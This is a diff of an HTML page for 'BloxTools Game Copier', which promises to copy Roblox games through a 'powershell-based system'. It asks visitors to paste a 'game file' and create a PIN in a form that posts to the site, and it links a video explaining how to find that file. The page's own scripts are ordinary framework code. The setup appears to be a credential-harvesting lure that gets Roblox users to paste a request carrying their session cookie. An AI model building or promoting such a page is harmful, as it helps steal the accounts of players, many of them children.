@@ -1,45 +1,104 @@
 <!DOCTYPE html>
 <html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Game Copier</title>
-    <link rel="stylesheet" href="styles.css">
-</head>
-<body>
-    <header>
-        <div class="logo">
-            <img src="roblox-logo.png" alt="Roblox Logo">
-        </div>
-    </header>
-    <main>
-        <h1 class="title">Game Copier</h1>
-        <p class="subtitle">Copy games with ease, with this brand-new PowerShell-based system!</p>
-        <div class="container">
-            <!-- Copy Games Section -->
-            <div class="copy-games">
-                <h2>BloxTools</h2>
-                <h3>Copy Games</h3>
-                <p>Paste your game file in the box below, then click "Copy Game!" If you don't know how to find a game's "game file" then go ahead and watch "How to use"</p>
-                <form>
-                    <input type="text" placeholder="Enter game file">
-                    <input type="text" placeholder="Create A Pin">
-                    <button type="button" class="copy-button">Copy Game!</button>
-                </form>
+    <head>
+        <meta charSet="utf-8"/>
+        <meta name="viewport" content="width=device-width, initial-scale=1"/>
+        <link rel="preload" href="/_next/static/media/4473ecc91f70f139-s.p.woff" as="font" crossorigin="" type="font/woff"/>
+        <link rel="preload" href="/_next/static/media/463dafcda517f24f-s.p.woff" as="font" crossorigin="" type="font/woff"/>
+        <link rel="stylesheet" href="/_next/static/css/aa2c73bdefbb8864.css" data-precedence="next"/>
+        <link rel="stylesheet" href="/_next/static/css/39ab5346724ca01f.css" data-precedence="next"/>
+        <link rel="stylesheet" href="/_next/static/css/8a00adc99516cf3a.css" data-precedence="next"/>
+        <link rel="preload" as="script" fetchPriority="low" href="/_next/static/chunks/webpack-376c7fc8990bfc6b.js"/>
+        <script src="/_next/static/chunks/4bd1b696-6b417c7997c4cbc9.js" async=""></script>
+        <script src="/_next/static/chunks/215-491851f94573219d.js" async=""></script>
+        <script src="/_next/static/chunks/main-app-8de0464ec52fec5b.js" async=""></script>
+        <script src="/_next/static/chunks/648-7bbdfa93412dd02c.js" async=""></script>
+        <script src="/_next/static/chunks/app/page-60f10bdff8e41cab.js" async=""></script>
+        <meta name="next-size-adjust"/>
+        <title>BloxTools</title>
+        <meta name="description" content="BloxTools is a tool for Roblox developers"/>
+        <link rel="icon" href="/favicon.ico" type="image/x-icon" sizes="16x16"/>
+        <script src="/_next/static/chunks/polyfills-42372ed130431b0a.js" noModule=""></script>
+    </head>
+    <body class="__variable_1e4310 __variable_c3aa02 antialiased">
+        <header id="navbar">
+            <div class="overlay"></div>
+            <div class="container">
+                <nav class="navbar navbar-expand-xl navbar-dark">
+                    <a class="navbar-brand" style="color:white" href="#">
+                        <img alt="BloxTools" loading="lazy" width="30" height="30" decoding="async" data-nimg="1" style="color:transparent" srcSet="/_next/image?url=%2Fimg%2Flogo.png&amp;w=32&amp;q=75 1x, /_next/image?url=%2Fimg%2Flogo.png&amp;w=64&amp;q=75 2x" src="/_next/image?url=%2Fimg%2Flogo.png&amp;w=64&amp;q=75"/>
+                    </a>
+                </nav>
             </div>
-
-            <!-- How to Use Section -->
-            <div class="how-to-use">
-                <h3>How to Use</h3>
-                <p>Video Tutorial</p>
-                <div class="video-container">
-                    <video controls>
-                        <source src="tutorial.mp4" type="video/mp4">
-                        Your browser does not support the video tag.
-                    </video>
+        </header>
+        <section id="features">
+            <div class="overlay"></div>
+            <div class="container">
+                <div class="row text-center justify-content-center">
+                    <div class="col-12">
+                        <div class="text-top">
+                            <h1>Game Copier</h1>
+                            <p>Copy games with ease, with this brand new powershell-based system!</p>
+                        </div>
+                    </div>
+                </div>
+                <div class="row">
+                    <div class="col-12">
+                        <h2>BloxTools</h2>
+                    </div>
+                    <div class="col-md-6 mb-8">
+                        <div class="box">
+                            <h3>Copy Games</h3>
+                            <br/>
+                            <p>Paste your game file in the box below, then click &quot;Copy Game!&quot;If you don &#x27;t know how to find a games &quot;game file &quot;then go ahead and watch &quot;How to use &quot;</p>
+                            <form method="post">
+                                <div class="form-input-icon mb-3 mt-4 rounded-lg border">
+                                    <i class="fas fa-file"></i>
+                                    <input class="auth-input" type="text" placeholder="Enter game file" id="code" autoComplete="off" minLength="3" required=""/>
+                                </div>
+                                <div class="form-input-icon mb-3 mt-4 rounded-lg border">
+                                    <i class="fas fa-lock"></i>
+                                    <input class="auth-input" type="number" placeholder="Create A Pin" id="pin" autoComplete="off" minLength="4" required=""/>
+                                </div>
+                                <button type="submit" class="button primary d-block mt-3 w-100">Copy Game!</button>
+                                <span>BloxTools</span>
+                            </form>
+                        </div>
+                    </div>
+                    <div class="col-md-6 mb-8">
+                        <div class="box">
+                            <h3>How to use</h3>
+                            <p>Video Tutorial</p>
+                            <video width="100%" height="250" controls="">
+                                <source src="https://bloxtools.net/videos/CopyGames.mp4" type="video/mp4"/>
+                            </video>
+                            <span>BloxTools</span>
+                        </div>
+                    </div>
                 </div>
             </div>
-        </div>
-    </main>
-</body>
+        </section>
+        <footer>
+            <p class="text-center">Copyright 2024 BloxTools. All rights reserved.</p>
+        </footer>
+        <script src="/_next/static/chunks/webpack-376c7fc8990bfc6b.js" async=""></script>
+        <script>
+            (self.__next_f = self.__next_f || []).push([0])
+        </script>
+        <script>
+            self.__next_f.push([1, "6:\"$Sreact.fragment\"\n7:I[9275,[],\"\"]\n8:I[1343,[],\"\"]\n9:I[6513,[],\"ClientPageRoot\"]\na:I[8816,[\"648\",\"static/chunks/648-7bbdfa93412dd02c.js\",\"931\",\"static/chunks/app/page-60f10bdff8e41cab.js\"],\"default\",1]\nd:I[3120,[],\"OutletBoundary\"]\nf:I[3120,[],\"MetadataBoundary\"]\n11:I[3120,[],\"ViewportBoundary\"]\n13:I[6130,[],\"\"]\n1:HL[\"/_next/static/media/4473ecc91f70f139-s.p.woff\",\"font\",{\"crossOrigin\":\"\",\"type\":\"font/woff\"}]\n2:HL[\"/_next/static/media/463dafcda517f24f-s.p.woff\",\"font\",{\"crossOrigin\":\"\",\"type\":\"font/woff\"}]\n3:HL[\"/_next/static/css/aa2c73bdefbb8864.css\",\"style\"]\n4:HL[\"/_next/static/css/39ab5346724ca01f.css\",\"style\"]\n5:HL[\"/_next/static/css/8a00adc99516cf3a.css\",\"style\"]\n"])
+        </script>
+        <script>
+            self.__next_f.push([1, "0:{\"P\":null,\"b\":\"tByLc5gXzEiIKXufXwjq5\",\"p\":\"\",\"c\":[\"\",\"\"],\"i\":false,\"f\":[[[\"\",{\"children\":[\"__PAGE__\",{}]},\"$undefined\",\"$undefined\",true],[\"\",[\"$\",\"$6\",\"c\",{\"children\":[[[\"$\",\"link\",\"0\",{\"rel\":\"stylesheet\",\"href\":\"/_next/static/css/aa2c73bdefbb8864.css\",\"precedence\":\"next\",\"crossOrigin\":\"$undefined\",\"nonce\":\"$undefined\"}],[\"$\",\"link\",\"1\",{\"rel\":\"stylesheet\",\"href\":\"/_next/static/css/39ab5346724ca01f.css\",\"precedence\":\"next\",\"crossOrigin\":\"$undefined\",\"nonce\":\"$undefined\"}],[\"$\",\"link\",\"2\",{\"rel\":\"stylesheet\",\"href\":\"/_next/static/css/8a00adc99516cf3a.css\",\"precedence\":\"next\",\"crossOrigin\":\"$undefined\",\"nonce\":\"$undefined\"}]],[\"$\",\"html\",null,{\"lang\":\"en\",\"children\":[\"$\",\"body\",null,{\"className\":\"__variable_1e4310 __variable_c3aa02 antialiased\",\"children\":[\"$\",\"$L7\",null,{\"parallelRouterKey\":\"children\",\"segmentPath\":[\"children\"],\"error\":\"$undefined\",\"errorStyles\":\"$undefined\",\"errorScripts\":\"$undefined\",\"template\":[\"$\",\"$L8\",null,{}],\"templateStyles\":\"$undefined\",\"templateScripts\":\"$undefined\",\"notFound\":[[\"$\",\"title\",null,{\"children\":\"404: This page could not be found.\"}],[\"$\",\"div\",null,{\"style\":{\"fontFamily\":\"system-ui,\\\"Segoe UI\\\",Roboto,Helvetica,Arial,sans-serif,\\\"Apple Color Emoji\\\",\\\"Segoe UI Emoji\\\"\",\"height\":\"100vh\",\"textAlign\":\"center\",\"display\":\"flex\",\"flexDirection\":\"column\",\"alignItems\":\"center\",\"justifyContent\":\"center\"},\"children\":[\"$\",\"div\",null,{\"children\":[[\"$\",\"style\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"body{color:#000;background:#fff;margin:0}.next-error-h1{border-right:1px solid rgba(0,0,0,.3)}@media (prefers-color-scheme:dark){body{color:#fff;background:#000}.next-error-h1{border-right:1px solid rgba(255,255,255,.3)}}\"}}],[\"$\",\"h1\",null,{\"className\":\"next-error-h1\",\"style\":{\"display\":\"inline-block\",\"margin\":\"0 20px 0 0\",\"padding\":\"0 23px 0 0\",\"fontSize\":24,\"fontWeight\":500,\"verticalAlign\":\"top\",\"lineHeight\":\"49px\"},\"children\":\"404\"}],[\"$\",\"div\",null,{\"style\":{\"display\":\"inline-block\"},\"children\":[\"$\",\"h2\",null,{\"style\":{\"fontSize\":14,\"fontWeight\":400,\"lineHeight\":\"49px\",\"margin\":0},\"children\":\"This page could not be found.\"}]}]]}]}]],\"notFoundStyles\":[]}]}]}]]}],{\"children\":[\"__PAGE__\",[\"$\",\"$6\",\"c\",{\"children\":[[\"$\",\"$L9\",null,{\"Component\":\"$a\",\"searchParams\":{},\"params\":{},\"promises\":[\"$@b\",\"$@c\"]}],null,[\"$\",\"$Ld\",null,{\"children\":\"$Le\"}]]}],{},null]},null],[\"$\",\"$6\",\"h\",{\"children\":[null,[\"$\",\"$6\",\"B4v_HcslFVOuv9jcLzBlj\",{\"children\":[[\"$\",\"$Lf\",null,{\"children\":\"$L10\"}],[\"$\",\"$L11\",null,{\"children\":\"$L12\"}],[\"$\",\"meta\",null,{\"name\":\"next-size-adjust\"}]]}]]}]]],\"m\":\"$undefined\",\"G\":\"$13\",\"s\":false,\"S\":true}\n"])
+        </script>
+        <script>
+            self.__next_f.push([1, "c:{}\nb:{}\n"])
+        </script>
+        <script>
+            self.__next_f.push([1, "12:[[\"$\",\"meta\",\"0\",{\"name\":\"viewport\",\"content\":\"width=device-width, initial-scale=1\"}]]\n10:[[\"$\",\"meta\",\"0\",{\"charSet\":\"utf-8\"}],[\"$\",\"title\",\"1\",{\"children\":\"BloxTools\"}],[\"$\",\"meta\",\"2\",{\"name\":\"description\",\"content\":\"BloxTools is a tool for Roblox developers\"}],[\"$\",\"link\",\"3\",{\"rel\":\"icon\",\"href\":\"/favicon.ico\",\"type\":\"image/x-icon\",\"sizes\":\"16x16\"}]]\n"])
+        </script>
+        <script>
+            self.__next_f.push([1, "e:null\n"])
+        </script>
+    </body>
 </html>
